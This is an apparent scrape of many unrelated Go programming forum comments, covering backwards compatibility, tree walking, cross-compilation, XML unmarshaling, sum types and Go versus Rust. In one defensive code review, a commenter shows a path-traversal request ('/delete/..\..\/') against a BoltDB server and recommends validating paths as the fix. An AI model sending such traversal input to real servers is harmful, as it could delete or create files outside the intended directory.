I think we need more humor in our lives. We take things way too seriously and we get offended way too easily nowadays. But I don't want to cause any trouble. Do you want me to delete the message?
Unfortunately nothing comes to mind for a book or full course on Kubernetes etc. A few exist on Udemy (like https://www.udemy.com/learn-devops-the-complete-kubernetes-course/) but I haven't personally taken them so I'm not sure how great they are. That has good reviews though.
Thank you for the feedback! Your last point is something I actually was wondering about myself? Would it make sense to use `Scanner` to read the input? I'm still working on understand the difference between `Reader` and `Scanner` and when to use what. Thanks!
&gt; A culture of “backwards compatibility at all costs” He sees that as a bad thing? WTF is he thinking? Backwards compatibility means less man hours wasted means code you wrote five years ago still compiles means your ecosystem is actually suitable for professional development.
Ugh, Iris.
It's not about what's written, it's about what makes it easier to write new things. 
TL;DR: "I can't take criticism."
It sounded pretty funny in my head. Maybe I was wrong.
If I knew Java. I'd be using Wowza. I've tried using that, but their WebRTC is experimental and requires too many hops to put into production. But still, no thanks with Red5. I'm looking for a GoLang only solution.
I think it's better to maintain a “backwards compatibility at all costs” mantra because if you don't place the expectations high enough, people break their interfaces just because it would be slightly more work to keep compatibility. Breaking compatibility should be seen as a last resort when the original interface really isn't salvageable at all. A better solution in those cases is to leave the old interface for legacy programs and add an entirely new one with all deficiencies fixed. To visualize the effects of breaking compatibility: Say, you have 1000 users and it would take 10 hours of additional work to not break the interface. If each users would take an hour to adapt their code to the new interface, 1000 man hours are wasted all for 10 hours you save. Isn't that shitty?
I was about to write you TL;DR: "I got no humor" but maybe I should write that to myself after all! :D
Open an issue on the tracker https://github.com/kataras/iris/issues/new and the author will be happy to help http://i.imgur.com/wbIE00M.jpg But jokes aside, I'm sorry you bumped into that project, I can assure you that it's the not like that in the Go community. There are plenty of projects that can help you get started. From net/http to gobuffalo you can probably find what you need. However, if you are just starting with Go I highly recommend that you have a look first at net/http, and how it works, as that's the core library behind almost all other routers / frameworks in Go. You can also join Gophers Slack, https://invite.slack.golangbridge.org/ , where a thriving community of gophers can help you with various issues.
If this is database/sql, go1.8 has some Context additions. But I bet you have another place where you miss closing a file handle. To check, use lsof! And check closing of request/response Bodys.
All snowflakes are special and unique.
Good job! Are you considering adding cryptocurrencies?
Closing over err in a defer'd func like that is pretty unreliable. Most go programs reuse the err variable for different things, so it might not even refer to a db error when this gets executed. Furthermore, it's not uncommon to shadow err inside an if statement. If a shadowed err is getting set, then you're not actually setting the outer err that this code will check. The solution would be either to handle your errors closer to where they are caused, or use [a pattern like this](https://blog.golang.org/errors-are-values) to explicitly store an error to be handled later. A bug like this would present itself as either a commit that should have been a rollback or visa versa. It wouldn't leak transactions, so it's probably not causing the problem that you're asking about. That said, you should consider cleaning it up.
Functional programmers will never submit that a stateful language is good for networking. 
Just a personal project, so i don't have to justify much.
"backwards compatibility" and "reuse code that's been already written" sound like cognitive biases to me. "plan to throw one (or two) away" may be the debiasing rule we need.
Just watch out for that L ;)
Please revisit this statement once you need to deal with the compatibility-breaking maintainers of the only library that can parse some complicanted obscure file format you need to interact with.
Hi there, just took a quick glance. So I looked at your server and see a few red flags. I'm not sure the details of your http router, but I see no [input validation](https://github.com/schollz/boltdb-server/blob/master/main.go#L243) and this is mixed with some potential danger depending on Params implementation. Since there is no validation there or at [db.go](https://github.com/schollz/boltdb-server/blob/master/db.go#L212) mixed with the use of path instead of filepath there could be potential attack vectors. The path package uses a slash separator and so do URL routers. This leaves the possibility for a request like **/delete/..\\..\\/** a possibility perhaps on windows. Go gives you protection vs null byte attacks like you may use to bypass forcing a .db extension to cause real damage here, but there are implications with even being able to create databases in directories outside the intended root. Anyways there may be nothing of serious consequence, but it's easy enough to fix with some basic input validation and proper user of filepath, so I would do that. To give you a couple hints towards proper filepath usage, have a single function like getDBPath(name string) (path string, err error), which will call filepath.Abs on name and ensure it is a child of db path settings Abs path. You could also simply have a meta info database that lives at the db root that maintains a mapping of names to file system locationsto avoid the problem with a benefit of an orderly fs and some persistence for db lists. You also have a map that lives in memory for lookups you could use for this purpose as well to achieve secure but ephemeral mappings. The API itself is clean and concise though so good job otherwise, have fun.
Something I made a while back - a selection-sort routine on a struct slice. These days of course with 1.8, I'd just use the new built-in sort-on-slice/struct function. But this one works fine, just change out my datatype and field for whatever. func SelectionSort(net []structs.Net_t) []structs.Net_t { var tempNet structs.Net_t var bestJ int for i := range net { tempNet = net[i] bestJ = i for j := i + 1; j &lt; len(net); j++ { if net[j].Users &gt; tempNet.Users { tempNet = net[j] bestJ = j } } net[bestJ] = net[i] net[i] = tempNet } return net } I use(d) it for sorting a list of networks based on users attached. Most "popular" first.
I don't think the author intended it but this article is rather troll-y. Haskell and Go are both what I would call reasonably well engineered languages. However apart from static typing, they have very different and opinionated philosophies. 
Turned out that virtually none of the libraries I found passed all requirements I had for the planned blog post. Especially, I was searching for a **high-level library** that also is **fairly feature-complete** (as opposed to focusing on one aspect only, e.g. a view panes library, a color text library, a progress bar library etc.) High-level because I don't want to write 300 lines of code for a simple input box. Feature-complete because I planned to do a side-by-side comparison of these libraries using a simple test application, to see how the code looks like for each of the libs. However, as there aren't any candidates for this kind of test available, I need to switch to a different strategy. Maybe I'll restructure the post as a mini-howto about a basic TUI application that can serve as a skeleton for more advanced apps. For this, there seem a couple of libs available that may or may not work together to build a feature-rich TUI app. For low-level TUI coding, there are termbox-go and tcell. For higher-level window management there are gocui and wm (not sure if the latter is under active development), and then there is termui for graphic status output (bar charts, line charts, lists,...), uitable and termtables for formatted output, and more. None of these seem to deliver some kind of dynamic view/panel sizing and/or mouse-based resizing out of the box. 
After some research (see the other comment I just posted), it turned out that most libraries I visited simply don't list the platforms they run on. At least termbox-go announces itself a cross-platform library with support for Windows. Which means that termui and gocui (both of which are based on termbox-go) should support the same set of platforms.
What is the end goal here? I don't understand what we need to do with all these folders. It sounds like we need to create them. If so you could make a recursive tree walker that would create a directory at each node. It would be helpful if we knew the context and any restraints here. Do you need to do this once? Once a second? Do you need to do this based on some sort of naming convention? If so do we know the names and how they fit together?
I've once had a similar problem and wrote a package to solve it for different sources and targets. See https://godoc.org/github.com/tideland/golib/scroller
&gt; Backwards compatibility means less man hours wasted means code you wrote five years ago still compiles means your ecosystem is actually suitable for professional development Backwards compatibility "at all costs" wastes hours. Look at the Windows API and all the `Ex`, `Ex2`, tons of obscure flags with missing definitions depending on where you look in the MSDN. Making sure your project works 5 years later is solved by package pinning. Not wasting time is solved by having good APIs. Also, "suitability to professional development" is usually correlated with terrible tooling and languages : Cobol, C, VB6. I even heard of a language called "Javascript", where nothing seems to last more than two years.
I used Python because it gave me an easy way to prove the concept. Even at these early stages I'm finding that the clang bindings are not very good (for Python), and I have to do a lot of tricky stuff to tease out the right tokens. Ideally Go would be the best (and most fun) language to use, obviously. However, it will come down to the best tool for the job that will require the least reinventing the wheel. That may be C++ (since that's what clang is written in) but I really want to avoid that if possible. Possibly even Go interpreting the AST dump (clang -ast-print). I'm not sure if this will make it more or less brittle. I'd really like to talk to someone that has worked with clang to discuss further.
Thanks! :)
&gt; Backwards compatibility "at all costs" wastes hours. Look at the Windows API and all the Ex, Ex2, tons of obscure flags with missing definitions depending on where you look in the MSDN. Microsoft did many questionable decisions, but keeping their interfaces 100% compatible was one of the extremely good decisions. This means that you can still compile and run your old Windows programs without having to worry that they break. This means that companies with large custom programs don't have to invest countless man hours to fix their programs when Microsoft changes things. &gt; Making sure your project works 5 years later is solved by package pinning. Not wasting time is solved by having good APIs. Seems like you haven't ever heard about security. How about we not pin dependencies to libraries from years ago with known security problems that have been already fixed? Of course I want to be able to link my program against the most recent version of dependencies! That's why I want them to be stable in the first place. &gt; Also, "suitability to professional development" is usually correlated with terrible tooling and languages : Cobol, C, VB6. I even heard of a language called "Javascript", where nothing seems to last more than two years. Javascript and VB6 are succesful because they allowed you to do things you can't do by any other mean. Cobol and C actually have quite fantastic tooling, though Cobol's tooling didn't adapt with the times, which might explain why it isn't very popular today. Indeed, I would say that C has among the best tooling of all existing languages. 
The challenge isn't really tailing a file as such, it's tailing it in a way that is cross-platform, detects file changes (e.g. deletes or renames, which requires watching the file descriptor through APIs like inotify), handles named pipes, etc. That `hpcloud/tail` library also does things like rate limiting. If you just want to tail a single file descriptor on a POSIX system, just keep reading, and sleep a little bit if you get `io.EOF`. Depending on how portable you want your program to be, you could also consider executing `tail` as a subprocess, since they've already done all the work for you.
Well I wasn't given much, all that I was told was to make the tree of folders then place the files in the folders of the bottom row of nodes. I'll look into the recursive tree walker, thank you. I just have one question, how would I make each node have 100 children? Do I just have 100 pointers in my tree struct?
This is a cop out. Just because Reddit happens to host this particular community, doesn't mean we can't have our own high bar for conduct. These types of toxic comments scare people away from wanting to put themselves out there and contribute to the sub.
I prefer to use a tree where each node has a list of children. Some people might argue a tree composed of linked lists might be better, or at least make for a better academic exercise. Here is an example of a tree composed of nodes, each with a list of children, and how to walk through it. https://play.golang.org/p/r2N1V2FvOZ Also for reference here is the source code to an article I wrote a while back. The article is gone, but I think the source is still valuable. Note in this example the tree is processed concurrently so that might be a little bit more involved then what you are going for. https://github.com/Nivenly/nivenly.com/blob/master/examples/go/concurrent_digraph_processing.go Does this help?
That's an interesting thought, I've actually never had issues with the points you made. As someone who comes from the C world of things, working with Go is an absolute treat. 
As someone who has wrote over 10kLOC in each I like both languages for different reasons. Currently using Haskell at work and love it, but would use go if the opportunity permitted.
&gt;&gt; Making sure your project works 5 years later is solved by package pinning. Not wasting time is solved by having good APIs. &gt; Seems like you haven't ever heard about security. How about we not pin dependencies to libraries from years ago with known security problems that have been already fixed? That's one of the nice things about semver. You can backport security and bug fixes to old versions, without having to be afraid of breaking compatibility. When you recompile old code, if you're pinned to a major version, you'll pick up any bug/security fixes that have been released.
Yeah that helps a lot, thank you very much :)
Glad it helped. It was a good exercise, I went ahead and dropped the source code off here in a write up. I know it's not exactly what you are looking for, but it's a good tree demo. https://www.nivenly.com/single-rooted-tree-in-go/
I thought that port forwarding was essentially "redirect all packets what come to this port, to this address:port" 
I know there isn't that much code, but can you provide a full file in a gist or similar? Thanks! Nice writeup.
I guess that was a poor choice of words ... go isn't prohibited, we just chose haskell and since we're down that path already there isn't much point in switching languages. A different project? Sure.
You need to learn about how precision works with floats, that will teach you why you cannot use them for currency.
I haven't tried this myself, but unless there is an open issue preventing this, it should be possible. The Go documentation [does not mention restrictions on the combination of GOOS and GOARCH values](https://golang.org/doc/install/source#environment). 
Out of curiosity (I know I can use \ instead): Is the lambda character used in the calculus code the Unicode lambda from the math symbols block, or rather the lamda [sic] from the Greek block? Or can I use both?
Thank you for explaining why they made this decision. Who would have thought? Perhaps you might wonder, if it is such a great decision, why nobody else does it to such an extend? And why even them drop features as they release new Windows versions? The point of backward compatibility is to keep using code without having to maintain it. But if you are so concerned about security, why not maintain the code in the first place? How are you gonna upgrade to the newer crytographic protocol? How are you gonna stop using that insecure hashing function? How will you upgrade your python, which now checks certificate validity, without maintaining your code? How are you going to stop using IE6, if your internal web app is IE6 only? What about those great "enterprise spreadsheet applications"? Or that business-critical VB6+access service? Store and use secrets securely? How are you going to enable those exploit mitagations without switching to 64bits? By breaking backward compatibility. &gt; Seems like you haven't ever heard about security. Turns out I did. Did you hear about technical debt? PS: C also has the best tooling for finding security vulnerabilities.
&gt; Thank you for explaining why they made this decision. Who would have thought? Perhaps you might wonder, if it is such a great decision, why nobody else does it to such an extend? And why even them drop features as they release new Windows versions? All good operating systems I know do that. If I recall correctly, you can compile and run Linux 1.0 binaries on modern Linux just fine (if you load the a.out kernel module). All good language and library standards do that. &gt; The point of backward compatibility is to keep using code without having to maintain it. But if you are so concerned about security, why not maintain the code in the first place? Time spent fixing bugs in your code is not time wasted. However, time spent adapting your code to pointless API changes is a huge waste. Why should I spend time changing my code because some maintainer was bored and broke interfaces? That's not what something I want to do. &gt; How are you gonna upgrade to the newer crytographic protocol? If you use, e.g. OpenSSL correctly, it automatically uses the most recent protocol version it supports. Not sure what point you have. &gt; How are you gonna stop using that insecure hashing function? That's one of the few cases where you indeed may need to change your code. However, this doesn't mean that such a thing is fine in general. You should do this change in such a way that people who use your code do not have to be fixed for this change to work with them. &gt; How will you upgrade your python, which now checks certificate validity, without maintaining your code? If you were writing code that doesn't do certificate checks, you were doing it wrong in the first place. &gt; How are you going to stop using IE6, if your internal web app is IE6 only? What about those great "enterprise spreadsheet applications"? Or that business-critical VB6+access service? Store and use secrets securely? How are you going to enable those exploit mitagations without switching to 64bits? I am not sure what you are trying to say here. You are listing cases where the framework/library maintainer didn't do their job and broke compatibility. My point is “library maintainers should try very hard not to break compatibility.” How does this constitute a counterpoint to my argument? And yes, you can be careful and not break your own API even when a dependency breaks your API. In a well-designed program (one that abstracts away the dependencies), this shouldn't even be difficult. &gt; Turns out I did. Did you hear about technical debt? Yes. Technical debt is a real thing which can be fixed by doing the right thing in the first place. Or by realizing the problem and adding a new API that supports the new use cases, leaving the old one untouched for compatibility. If Linux can do it, you can do it, too.
Here is the same binary built two ways. The host machine is amd64 in this case, but it wouldn't matter, you'd see the same thing if the host machine was 386: $ GOARCH=amd64 go build -o amd64 $ GOARCH=386 go build -o 386 $ ls -l 386 amd64 -rwxrwxr-x 1 jra jra 2281296 Mar 20 08:39 386 -rwxrwxr-x 1 jra jra 2814120 Mar 20 08:39 amd64 $ file 386 amd64 386: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped amd64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped They are not "the same binary", because they are the 2 different binaries for the 2 different architectures that you are asking about. However, they are semantically the same binary, in that they are built from the same code, and are expected to implement the same semantics, even if the byte stream of instructions to the CPU differs. If they show different semantic behavior, that's a defect you can file an issue on. -jeff BTW: Remember that you can run "GOARCH=xxx go install" in your $GOROOT/src directory in order to speed up future builds. Otherwise, your cross-arch builds will always build the entire standard library from scratch. Same is true for cross-OS builds (i.e. using a Linux host to make Windows binaries.)
you can actually defer tx.Rollback() after opening and if you tx.Commit() before returning the rollback will have no effect (it will error but silently) 
The XML unmarshaler implemented by `encoding/xml` looks for a special field present in a `struct` type of the value to unmarshal an XML element into, and tries to find there a special field named `XMLName`. If it's present, it defines the local name (and possibly the namespace) of the element to unmarshal. In `go doc encoding/xml.Unmarshal`, we read: &gt; Unmarshal maps an XML element to a struct using the following rules. In the &gt; rules, the tag of a field refers to the value associated with the key `xml` &gt; in the struct field's tag (see the example above). &gt; &gt; …. &gt; &gt; * If the `XMLName` field has an associated tag of the form &gt; "name" or "namespace-URL name", the XML element must have &gt; the given name (and, optionally, name space) or else Unmarshal &gt; returns an error. The definition type Station struct { XMLName xml.Name xml:"http://wsiv.ratp.fr/xsd Station" ... } states that this type is to be used to unmarshal XML elements named `{http://wsiv.ratp.fr/xsd}Station` — notice the capital "S". Now consider this type: type GetStations struct { XMLName xml.Name xml:"http://wsiv.ratp.fr getStations" Station *Station `xml:"station,omitempty"` ... } Here, the `xml` tag on the "Station" field of this type is used to explicitly tell the unmarshaler that the expected XML element to be unmarshaled into this field must have the name "station" (notice the small "s") but the field's type, `Station` also explicitly tells the unmarshaler the corresponding XML element must be named "Station" (and have the namespace!). Again, from the doc: &gt; * If the XML element contains a sub-element whose name matches &gt; the prefix of a tag formatted as "a" or "a&gt;b&gt;c", unmarshal &gt; will descend into the XML structure looking for elements with the &gt; given names, and will map the innermost elements to that struct &gt; field. A tag starting with "&gt;" is equivalent to one starting &gt; with the field name followed by "&gt;". What I find really strange about all this, is that each element of an XML doument is defined to be in *some* namespace; if it's not specified, it's defined to be an empty one "" (IIRC). So I'd say the conflict should be not about `Station` vs `station` but rather about `{http://wsiv.ratp.fr/xsd}Station` (namespaced) vs `station` (without one). I'm not sure what's at fault here—the `wsdl2go` package or the WSDL itself or Go, but you could start here.
&gt; If you use, e.g. OpenSSL correctly, Using OpenSSL corretly includes specifying the ciphers in the order you want them used, **because of backward compatibility**. You have to change these settings as time goes by. Please stop with the security angle, you are clueless. &gt; My point is “library maintainers should try very hard not to break compatibility.” No it is not. That's your point: &gt; I think it's better to maintain a “backwards compatibility at all costs” mantra Everybody will agree it's better to try to maintain backward compatibility. Reality disagree with the fact that it is even possible in the long run for software that is actually used. &gt; you were doing it wrong in the first place &gt; In a well-designed program (one that abstracts away the dependencies), this shouldn't even be difficult. &gt; Technical debt is a real thing which can be fixed by doing the right thing in the first place. That works as long as you can write perfect code, that not only is great on day one, but also anticipates all possible future changes. But then, that's not hard to maintain backward compatibility, as your software is perfect, and doesn't need new versions. Please have a reality check: people make mistakes, requirements evolve. Sometimes you can get away with them, sometimes you have to fix them.
tail's related repository is **[file-tail](http://github.oldjpg.com/repository/284367)** &gt;File::Tail for Ruby
It's a practice from functional(ish) languages - it's called **pattern matching** . Basically it ensures a static way of checking for edge conditions - improving the safety of the code in the process
As the README says, it is particularly valuable when adding variants to existing sum types. The tool will tell you exactly which type switch statements need to be updated. This seems orthogonal to the number of variants.
Imagine you have to implement a function [like this](https://golang.org/src/go/ast/walk.go?s=1311:1342#L41). Now imagine you add a new AST node to your package. This tool would tell you that your `Walk` function needs to be modified to cover the new AST node. This pattern isn't particularly common in Go, which is understandable given that it isn't codified in the language. But it can be useful. There's even a little bit of commentary on it in the Go FAQ: https://golang.org/doc/faq#variant_types &gt; then the package can include a global no-name assignment This is orthogonal. This merely guarantees that a particular type is a variant of an interface-based sum type.
Interestingly, a couple prominent functional languages with pattern matching don't actually do exhaustiveness checks by default, while at least one prominent non-functional language with pattern matching *does* do exhaustiveness checks by default. :-)
Yes, the toolchain is always a cross compiler. For pure Go packages it doesn't matter what your build system is. Only the target. 
Yeah, that was the motivation for the *functional(ish)* in the reply 😃 My main experience is from F# and Swift. Though I don't *mind* the exhaustiveness checks - it's not a feature I find particularly useful
&gt; BTW: Remember that you can run "GOARCH=xxx go install" in your $GOROOT/src directory in order to speed up future builds. Otherwise, your cross-arch builds will always build the entire standard library from scratch. Same is true for cross-OS builds (i.e. using a Linux host to make Windows binaries.) Or you build with `go build -i` which will cache all compiled packages until they change. 
You're reading from and writing to the channel `ch`, but it's not defined anywhere. Please link to your _complete_ code somewhere?
OMG, did not know that there are so many of them!
I don't think anyone is pretending to write perfect code. Backwards compatibility "at all costs" is something for the core Go libraries, and it's very useful in that I can upgrade all my code to new a Go version without a massive amount of pain or concern that I have to upgrade a third party library that makes breaking changes to do it. The Go team do a great job of adding things like contexts, performance improvements, http connection draining and other features without breaking things, and users can progressively upgrade their code at their own pace. Just look at Python 3 to see how disruptive core language changes can be to the community (heck, 2.6 is still around on various LTS platforms despite the SSL/TLS issues). "dep" is coming, and things like "gb" and others already exist. Library maintainers make their own choices on backwards compatibility, and many popular ones use things like http://labix.org/gopkg.in to make breaking changes. I don't think it's nearly as dogmatic as you suggest, but I also think it's very useful that it's generally accepted that you shouldn't break compatibility.
You want to see what happen when you want to maintain perfect backward compatibility in an API after 20 years ? Look at the DOM and JavaScript in general.
In Rob Pike's [Errors are values](https://blog.golang.org/errors-are-values) blog post, he works through an example that avoids the visual clutter of explicit error checks at every step, while still ensuring errors are returned. It looks like this package does something similar.
I think the problem is that you missed the fact that Go and Rust have fundamentally different philosophies, and most (though not all) of what you propose as "improvements" to Go would take it farther away from its philosophical roots. For instance, it is designed to be _simple_... like, really, really simple. It is deliberate, or at the very least not something the designers are bothered by, that you can't chain together seven list methods to do something functionally, because the language is designed to be used in teams where still the majority of programmers are not familiar with the functional paradigm. I realize this can be difficult to believe if you live in the Rust community and hang out on /r/programming, and let me be clear that I am being totally serious and not sarcastic about this, but: Functional paradigms remain a strong minority in the programming community at large. I say this as one who is quite skilled in Haskell; I'm not saying this because I don't understand functional programming but precisely because I _do_, and I can see how few programmers are comfortable with that paradigm. In fact, I even see programmers sometimes catch the functional bug and end up sort of "bouncing off", when they still can't make it work for them after a couple of months. For better or worse, it is certainly not the case that once someone learns FP they never go back. (Another big FP failure case I see a lot in the Javascript world is that someone will learn how to use something like, say, jQuery that has a functional-ish core, but they only use it as an API. It is in fact quite easy in jQuery to write your own custom methods that chain together several elements of a query, for instance, for reusability, but people get confused if you do that in their code base. Even a lot of people who use "functional programming" still have only an API-deep understanding of FP, in that they can use FP APIs but can't or won't extend them. Even FP isn't necessarily as popular as it superficially appears.) A lot of the rest of the objections have similar issues as well. Personally, as one who is skilled in Haskell (i.e., has used pipes and lenses and type families to implement running code), and as someone who has to deal with a ___lot___ of other people's code as my day job (I don't greenfield very often and even my greenfield is generally a reimplementation of a component, not a from-scratch write), one of the reasons I favor Go professionally is precisely that it _prevents_ people from going crazy with their code and creating a dense clump of immiscible code in some super-local paradigm mix that composes poorly with all the other bits of code. A lot of programmers, functional, dynamic, and otherwise, tend to create immiscible blobs of code that wildly use all sorts of features not-quite-correctly, and the combinations of all these bits of code become very difficult to read. It's difficult to create that in Go. Emphasis on the "professionall" part of the above paragraph. Personally I use more powerful languages. But as my day job is dealing with 10-year-old code made with man-millenia in a "more powerful" language, the virtues of "more power" have palled for me.
Sure, here it is - [link](https://github.com/avinassh/virtu/blob/b085cd33062402a630b15c1b25c005ae88b41d16/main.go)
Exactly.
I'm open to adding options to the tool, including support for Go-style enums. :-)
Good point. But even without dot-chaining, I doubt that I can get comfortable with this style of error tracking. To me, Rob Pike's version is even less readable than the dot-chaining style, as the program flow is hidden inside a wall of `ew.write(...)` statements. --- Edit: removed silly dialogue.
It lets you load and execute code at runtime. I guess an example might be best. Say you have a metrics collection program written in Go. It knows how to use SNMP to collect metrics from SNMP capable devices. If you wanted to be able to add the ability to use SSH to connect to a device and get some data, then you'd need to add that to the code and recompile it. Anyone else who wanted to use your SSH code would either have to use your forked version, or download and apply your patches to the base distribution. A better way would be to use a plugin system. The base collector program would define the function signature required for any collector, and people could write plugins that do whatever they want. Then they could just drop the plugin into a directory, modify a config file to tell it to use the plugin, and the base program could read a list of plugins from the config file, load those plugins, then execute the collection function for each plugin. People would no longer have to recompile or use a forked version, they could just download your plugin.
Good points! I came across a post that brought up similar issues: https://dave.cheney.net/2015/07/02/why-go-and-rust-are-not-competitors I think that in an ideal world enforced simplicity would not be a determining factor in language design, or language selection. It could be that I just really want to live in that world. Generics would enable a lot of abstractions, which would open the floodgates to less-simple code. Do you think that Go will not, or should not, implement support for generics in a future major-version release? Or does Go's simplicity come from a combination of factors, and not just from omission of generics? How about ideas like non-nil-able types, and removing zero values? Do you think that those changes would harm Go's simplicity?
&gt; Sum types can be hard to grok (especially in a language that doesn't support them) if you've never used them in anger before. That's pretty dismissive. It's pretty trivial to understand the concept. You've clearly spent a lot of time on this, so it's valuable to you. I'm trying to understand WHEN it would be valuable to my projects.
&gt; The main reason I'm frustrated is that it essentially a big list of facts about the language, with each fact followed by complaints about the downside of that fact. In effect, there is no new information here—least of all to someone who is familiar with the language. I'm sorry that the post is frustrating. I was hoping to be constructive in the sense of pointing out alternative solutions to specific problems that may not be obvious to people who are familiar with Go who are not familiar with, e.g., Rust. &gt; The underlying philosophy, it seems to me, is that computational costs should be apparent (or easily discoverable) after a straight-line reading of the code. Function calls can hide CPU burn, but that's kind of understood: we need to read functions to understand what they'll do. But we have a good intuitive understanding of what == or make will do, and it's more important that those intuitions aren't subverted, than we grant extra flexibility to libraries to hide computation within them. I think that making performance transparent is a value trade-off with programmer time. I think that I can be most productive if I can hide as much code as possible behind reusable abstractions. And if the type-checker is taking advantage of information from generics and non-nullable types then the type-checker is able to identify a larger set of problems quickly, meaning that I spend less time debugging, and less time writing tests by hand. My experience is that hidden performance problems are not common enough to be worth giving up reusable abstractions. But I mostly write web apps, which are not the most performance-critical applications around.
Thank you a lot! Will try to fix that when I get home :)
&gt; This would mean that any struct with a private field would be un-instantiatable by outside packages, as those packages don't have access to those private fields. That demands that all public structs with private fields have constructors. There's now a demand placed on all users who want public structs with private fields. That would mean more code, yes. But does more code hurt simplicity in the sense of encouraging code that is easy for other programmers to understand and to maintain? Getting rid of zero values removes some ambiguities, such as "is it ok to use the zero value for this struct type in this context?" If the struct fields are all public, or if there is a zero-argument public constructor you get a clear signal that it is safe to initialize the struct as you please. On the other hand, if there are private fields, and the only public constructor has required arguments, that is a clear signal that there is an invariant that requires a specific initialization process. &gt; Would non-nilable types make Go less simple? Yes, now there's this, hopefully just one, keyword that is only used in type declarations but is only valid on type declarations that are already nillable. This means, if you want your struct which is used as a pointer to be non-nillable, you need to declare its type twice? Like this? The languages that I know of that implement nullable vs non-nullable types make types non-nullable by default. Making everything non-nil-able by default would certainly be a breaking change for Go! But maybe the language designers will be able to justify breaking compatibility in Go 2.0. I'm going to run with that hypothetical for a moment. Types would be declared exactly as they are now. But any variable that might hold `nil` would have to have a `?` prefix on its type. You can think of `?` as an operator that yields a union of the given type and the type of `nil` (where the `nil` type has one possible value, which is `nil`). // Consuming a nil-able type - nil-ability is signaled with the prefix `?` func GetField1(s ?*MyStruct) (int, bool) { if s == nil { // Type-checking should fail if `s` is referenced without a check like this return (0, false) } else { return (s.field, true) } } // Consuming a non-nil-able type - this time there is no need for a `nil` check, // and there is no need to represent a failure case in the return value. func GetField2(s *MyStruct) int { return s.field } &gt; you now need to define a default value for this type somewhere You're right - there is no good option for a default value for a non-nil-able type. In fact, a default value would defeat the purpose. This is a change that would break the assumption that all types have a default value. But if you get rid of zero values, that assumption would be broken anyway. The lack of a default value for a non-nil-able type would mean that it would be an error to use an uninitialized variable with a non-nil-able type. Edit: fixed a typo
&gt; Sum types are truly amazing things, but most of the codebase contains it like "I couldn't create a proper abstraction, so here, have a set of different types which have nothing in common". I have never seen Rust software where this was true. Sum types are an invaluable part of software design here. I use them quite extensively in my own projects with significant success in reducing boilerplate and increasing maintainability over time as the software evolves with new features. &gt; Null-safety is cool, but at the same time it prevents library\project devs from thinking about default state. Not so in any Rust codebase you'll find. There's no question about the default state of a value. &gt; All of this combined produce code that is really hard to support and extend. There is basically no truth to this statement. It's easier to extend software and APIs when using sum types compared to not using them at all. You can create custom error types that convey specific additional information about the error without needing a heap allocation, and you may return custom types that define specific tokens or actions along with values needed for that branch, without heap allocations. This allows you to conveniently abstract otherwise complicated flow logic into tiny interchangeable pieces. &gt; Remember, using map function doesn't make you smarter. Understanding when you can use simple while does. No one is arguing that using functional methods make you smarter. The argument is that there is no point in wasting several lines of code writing boilerplate that could have been conveniently expressed in a single line of code with less room for error, and more room for compiler optimizations.
I can imagine code reviews being easier with Go also. If there is only a limited style, then there is less avenue for complaints. I can just imagine an fp code review (could be more idiomatic here, could've used this abstraction here, could've composed here, make these immutable ... . Nothing wrong with that, its just sometimes you get the feeling your doing things to suit the code reviewers own style. 
When would you consider it validated? There's already many projects successfully using Rust at scale.
About nil, I think that if rust becomes a more "mainstream" language, it's going to have a lot more "nullpointer" exceptions due to .expect abuse. If your trying to use a nil-pointer, it means that you have a programming error and your program should crash. Forcing an initialization won't help, as it will just hide the bug.
&gt; I have never seen Rust software where this was true. Sum types are an invaluable part of software design here. I use them quite extensively in my own projects with significant success in reducing boilerplate and increasing maintainability over time as the software evolves with new features. I did. Github trending. &gt; Not so in any Rust codebase you'll find. There's no question about the default state of a value. You missing the point. When you return Option to me, you essentially saying - "Okay, there can be something, there can be nothing. Please handle both situations (or use `unwrap` most of the time) gracefully." Where I, as a method/function/library/project user want the default state most of the time. &gt; There is basically no truth to this statement. Again github trending. &gt; It's easier to extend software and APIs when using sum types compared to not using them at all. Yup. Try to add a new type to tagged union in function which is called in tree form from several places in big project (I'm talking 1kk+ big). Watch out for poison in your coffee. &gt;You can create custom error types that convey specific additional information about the error without needing a heap allocation Before we continue, please provide an example when creating value in heap has almost (like few percents of difference) the same price as putting object onto stack. It's a very easy question, but without you knowing it its very difficult to argue about heap vs stack allocation. &gt; This allows you to conveniently abstract otherwise complicated flow logic into tiny interchangeable pieces The problem is that most people don't know when to stop. You know, how we all "hate" spaghetti code? Yeah - you can write even better spaghetti using FP. &gt; wasting several lines of code writing boilerplate that could have been conveniently expressed in a single line of code with less room for error That has been argued to death in C and C++ communities. General abstraction is not always the best abstraction. Quicksort as an example. Also - nothing prevents errors in std lib in any language. If you think that you are safe, when you are using standard facilities, you are in new world of pain.
Thanks for the great article. I too sometimes get frustrated by the constraints of the type system, error handling, and lack of generics in Go. But more often than not, it means i'm trying to fix a faulty design by making it more complicated. I've never written any code in Rust but it seems like an amazing language where you have to be very precise, and when everything comes together you'll have a very realiable and solid program. Looking forward to try it. Thanks again. 
Hmm I like this approach 
Thanks! I appreciate that glimpse at your point of view. And I love positive comments!
Just few hours ago I tried to use Context in some requests. The problem I faced is that when ExecContext gives me error due to some reason, the next request is cancelled with error "pq: canceling statement due to user request". P.S. I am using Postgres. P.S.S. I am also using Context WithTimeout for 2 sec.
&gt; You're right - there is no good option for a default value for a non-nil-able type. In fact, a default value would defeat the purpose. Not necessarily, since we're comparing Go and Rust: https://doc.rust-lang.org/std/default/trait.Default.html though IME it turns out not to be very useful in practice, a non-parametric "constructor" function is usually simpler. &gt; The lack of a default value for a non-nil-able type would mean that it would be an error to use an uninitialized variable with a non-nil-able type. Note that these are orthogonal concerns, C# has default values for all types (accessible via `default(T)` though I don't think there's an overriding protocol) yet it does not allow using unset variables (even though they are initialised with the relevant default value).
&gt; So you have no examples to give other than trying to point people into a wild goose chase? "GitHub trending" is not an example of sum types. No - I simply do not want to waste my time, when somebody making claims about Heap vs Stack without understanding the allocation model. Sorry. &gt; Spoken like someone with minimal to no exposure to Rust. https://github.com/BurntSushi/ripgrep F3 `unwrap`.
&gt; This is some serious straw grasping that you are trying to do now. You could "steel man" the discussion and be nicer/more convincing by doing what was presumably intended: do a code search on the whole repository, not just the front page. https://github.com/BurntSushi/ripgrep/search?utf8=%E2%9C%93&amp;q=unwrap
